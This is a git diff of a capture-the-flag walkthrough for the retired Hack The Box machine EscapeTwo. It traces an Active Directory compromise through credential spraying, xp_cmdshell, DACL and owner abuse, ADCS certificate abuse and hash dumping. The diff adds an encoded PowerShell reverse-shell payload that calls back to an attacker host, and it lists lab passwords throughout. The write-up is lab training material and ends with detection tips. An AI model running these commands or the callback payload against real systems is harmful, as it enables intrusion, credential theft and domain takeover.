@@ -9,9 +9,7 @@ pin: false
 
 # Assumed Breach to Domain Admin – HTB EscapeTwo Walkthrough
 
-This post demonstrates a full-path Active Directory compromise using initial credentials, misconfigured services, and post-exploitation techniques. Based on the retired <a href="https://app.hackthebox.com/machines/EscapeTwo" target="_blank">HTB EscapeTwo</a> machine.
-
----
+This post demonstrates a full-path Active Directory compromise using initial credentials, misconfigured services, and post-exploitation techniques. Based on the retired [HTB EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo) machine.
 
 ## 🧠 Adversary Tradecraft Timeline
 
@@ -25,8 +23,6 @@ This post demonstrates a full-path Active Directory compromise using initial cre
 | Lateral Movement | OwnerEdit + DACL + ShadowCreds | Took over `ca_svc`               |
 | Full Compromise  | ADCS abuse → cert + PFX login  | WinRM as Administrator           |
 
----
-
 ## 🔐 Initial Credentials
 
 ```bash
@@ -34,13 +30,9 @@ Username: rose
 Password: KxEPkKe6R8su
 ```
 
-Save to file:
-
 ```bash
 echo -e "rose\nKxEPkKe6R8su" > creds.txt
 ```
-
----
 
 ## 🔍 Network Scanning
 
@@ -48,21 +40,17 @@ echo -e "rose\nKxEPkKe6R8su" > creds.txt
 sudo nmap -p- --min-rate 10000 -sCV -Pn -oN enum.nmap 10.10.11.51
 ```
 
----
-
 ## 🧪 Protocol Enumeration (NetExec)
 
 ```bash
 for p in smb vnc rdp ssh ftp nfs wmi winrm mssql ldap; do netexec $p 10.10.11.51 -u rose -p 'KxEPkKe6R8su'; done
 ```
 
-Sample output:
+Result:
 
-```text
+```
 SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su
 ```
-
----
 
 ## 📁 SMB Share Access
 
@@ -73,9 +61,7 @@ prompt off
 mget *
 ```
 
-Found: `accounts.xlsx`
-
----
+Discovered: `accounts.xlsx`
 
 ## 📊 Parse Excel File
 
@@ -95,8 +81,6 @@ Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo
 NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!,
 ```
 
----
-
 ## 🧪 Credential Spraying
 
 ```bash
@@ -106,11 +90,9 @@ netexec mssql sequel.htb -u users -p passwords --continue-on-success --local-aut
 
 Found:
 
-```text
+```
 DC01\sa : MSSQLP@ssw0rd!
 ```
-
----
 
 ## 🛠️ Privileged MSSQL Shell
 
@@ -118,7 +100,7 @@ DC01\sa : MSSQLP@ssw0rd!
 impacket-mssqlclient 'sa':'MSSQLP@ssw0rd!'@sequel.htb
 ```
 
-Enable command exec:
+Enable cmd exec:
 
 ```sql
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -126,17 +108,21 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
----
+## 👚 Reverse Shell (via HoaxShell)
 
-## 👚 Reverse Shell
-
-Use revshells.com to generate payload and run:
-
-```sql
-EXEC xp_cmdshell "powershell -enc <base64>"
+```bash
+git clone https://github.com/t3l3machus/hoaxshell
+cd hoaxshell
+sudo pip3 install -r requirements.txt
+chmod +x hoaxshell.py
+sudo python3 hoaxshell.py -s 10.10.14.12
 ```
 
----
+On MSSQL:
+
+```sql
+EXEC xp_cmdshell "powershell -enc JABzAD0AJwAxADAALgAxADAALgAxADQALgAxADIAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGIAZAAxADIAOABlAGUANgAtAGYANQBkADQANgAzAGYAZQAtAGIAYwA5ADIAZgBiADEAMwAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBiAGQAMQAyADgAZQBlADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANgBjADIAYgAtAGIANQAyADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA1AGQANAA2ADMAZgBlACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAYwA5ADIAZgBiADEAMwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA="
+```
 
 ## 🧠 AD Recon (BloodHound)
 
@@ -145,15 +131,13 @@ ldapdomaindump ldap://dc01.sequel.htb -u sequel.htb\\rose -p 'KxEPkKe6R8su'
 bloodhound-python -u rose -p 'KxEPkKe6R8su' -d sequel.htb -c all
 ```
 
-Check ACL rights via PowerShell:
+PowerShell check for ACL:
 
 ```powershell
 $u="SEQUEL\ryan";Get-ADUser -Filter *|%{$dn="AD:$($_.DistinguishedName)";$a=Get-Acl $dn;$h=$a.Access|?{$_.IdentityReference -eq $u -and $_.ActiveDirectoryRights -match 'WriteOwner|GenericAll|GenericWrite|All'};if($h){Write-Host "User: $($_.Name)" -ForegroundColor Cyan;$h|fl;Write-Host "-----" -ForegroundColor DarkGray}}
 ```
 
----
-
-## 🏗️ Takeover ca_svc via ACL + Owner Abuse
+## 🏗️ Takeover ca_svc via ACL Abuse
 
 ```bash
 impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
@@ -161,26 +145,20 @@ impacket-dacledit -action write -rights FullControl -principal 'ryan' -target 'c
 net rpc password "ca_svc" "w1ldP@ssword2022" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "sequel.htb"
 ```
 
----
-
 ## ⚙️ ADCS Abuse (ESC1 / ESC4)
 
 ```bash
 certipy-ad find -u ca_svc -p w1ldP@ssword2022 -dc-ip 10.10.11.51 -vulnerable
-certipy-ad template -u ca_svc -p w1ldP@ssword2022 -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51
+certipy-ad template -template DunderMifflinAuthentication -u ca_svc -p 'w1ldP@ssword2022' -dc-ip 10.10.11.51
 certipy-ad req -u ca_svc -p w1ldP@ssword2022 -target sequel.htb -dns sequel.htb -ca sequel-dc01-ca -upn Administrator -template DunderMifflinAuthentication
 ```
 
----
-
-## 🔐 Use PFX to Authenticate & Dump Hashes
+## 🔐 Use Certificate to Authenticate & Dump Hashes
 
 ```bash
 certipy-ad auth -pfx administrator_sequel.pfx -username Administrator -domain sequel.htb
 secretsdump.py -k -no-pass -just-dc sequel.htb/Administrator@sequel.htb
 ```
-
----
 
 ## 🪟 Admin Shell (WinRM)
 
@@ -188,16 +166,12 @@ secretsdump.py -k -no-pass -just-dc sequel.htb/Administrator@sequel.htb
 netexec winrm sequel.htb -u Administrator -H <NTLM_HASH>
 ```
 
----
-
 ## 🔍 Blue Team Detection Tips
 
-- Alert on `xp_cmdshell` enable/config changes
-- Monitor certificate enrollments (esp. non-users)
-- Audit owner/DACL changes to sensitive accounts
-- Disable vulnerable ADCS templates (ESC1–ESC8)
-
----
+- Alert on `xp_cmdshell` usage or configuration
+- Monitor certificate enrollments for abnormal usage
+- Audit owner/DACL modifications to sensitive objects
+- Harden and audit ADCS templates regularly (ESC1–ESC8)
 
 ## ✅ Summary
 
